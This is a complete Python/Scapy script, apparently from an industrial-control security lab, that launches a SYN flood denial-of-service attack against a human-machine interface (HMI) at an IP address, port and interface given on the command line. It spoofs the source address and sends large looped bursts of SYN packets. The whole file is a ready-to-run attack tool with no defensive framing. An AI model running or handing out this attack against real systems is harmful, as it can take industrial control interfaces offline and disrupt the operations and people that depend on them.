import logging
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import random
import time
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sendpfast
from scapy.volatile import RandShort

def generate_IP_on_network(target):
    return ".".join(target.split('.')[:3])+".0"

def attack(target, port, iface):
    print("Synflooding "+target+":"+port+"...")
    pkt = Ether()/IP(src=generate_IP_on_network(target),dst=target, ttl=255)/TCP(flags="S", sport=[RandShort() for x in range(15000)], dport=int(port))
    sendpfast(pkt, loop=1000, file_cache=True, iface=iface)

if len(sys.argv) != 4:
    print("Incorrect usage: pass HMI IP address, port, and interface as command line arguments")
    print("python3 SYNFloodAttack.py [HMI IP] [PORT] [Interface]")
    print("Ex: python3 SYNFloodAttack.py 192.168.56.101 9090 eth0")
    sys.exit(2)
    
attack(sys.argv[1], sys.argv[2], sys.argv[3])
